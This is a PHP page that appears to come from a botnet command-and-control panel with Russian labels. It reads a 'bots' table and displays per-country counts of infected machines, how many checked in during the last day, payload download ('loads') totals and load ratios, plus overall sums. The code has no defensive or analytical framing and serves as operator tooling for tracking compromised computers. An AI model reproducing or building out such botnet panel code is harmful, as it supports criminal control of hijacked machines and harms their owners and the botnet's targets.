<?php

if(!defined('GRANTED')) die;

include '../include/mysql.php';
mysql_connect($db_host, $db_user, $db_pass) or die('<font color=red>Не удалось подключиться к базе!</font>');
mysql_select_db($db_name) or die('<font color=red>Не найдена база "'.$db_name.'"!</font>');

$answ = mysql_query("SELECT country, COUNT(country) AS total, SUM(onboard) FROM bots GROUP BY country ORDER BY total DESC");

if ($ccoun = mysql_num_rows($answ)) {

	while ($row = mysql_fetch_array($answ)) {
		$v0[]=$row['country'];
		$v1[]=$row['total'];
		$v2[]=$row[2];
	}

	$total = array_sum($v1);
	$totld = array_sum($v2);

	$answ = mysql_query("SELECT country, COUNT(country) AS total FROM bots WHERE lastknock>".(time()-86400)." GROUP BY country");

	while ($row = mysql_fetch_array($answ)) $day[$row['country']]=$row['total'];

	echo ' <table align=center width=900 class=table style="margin-bottom:5px;" cellpadding=1 cellspacing=1>
<tr align=center>
	<td class=table1 width=35px>Флаг</td>
	<td class=table1 width=35px>ISO</td>
	<td class=table1>Страна</td>
	<td class=table1 width=120px>За день</td>
	<td class=table1 width=120px>Всего</td>
	<td class=table1 width=50px>%</td>
	<td class=table1 width=120px>Загрузки</td>
	<td class=table1 width=120px>Нагрузка</td>
</tr>';

	while (current($v1)) {

		echo '<tr align=center onmouseover="this.className=\'string\';" onmouseout="this.className=\'\';">
	<td>-</td>
	<td>'.$COUNTRY_CODE[current($v0)].'</td>
	<td nowrap>'.$COUNTRY_NAME[current($v0)].'</td>
	<td>'.intval($day[current($v0)]).'</td>
	<td>'.current($v1).'</td>
	<td>'.round(current($v1)/$total*100, 2).'</td>
	<td>'.current($v2).'</td>
	<td>'.round(current($v2)/current($v1), 2).'</td>
</tr>';
		$bots += current($v1);
		next($v0);
		next($v1);
		next($v2);

	}

	echo '<tr align=center>
	<td class=table1 colspan=2>Итоги:</td>
	<td class=table1>Всего стран: '.$ccoun.'</td>
	<td class=table1 colspan=2>Ботов: '.$bots.'</td>
	<td class=table1 colspan=2>Загрузок: '.$totld.'</td>
	<td class=table1>Нагрузка: '.round($totld/$bots, 2).'</td>
</tr>
</table>';

}

?>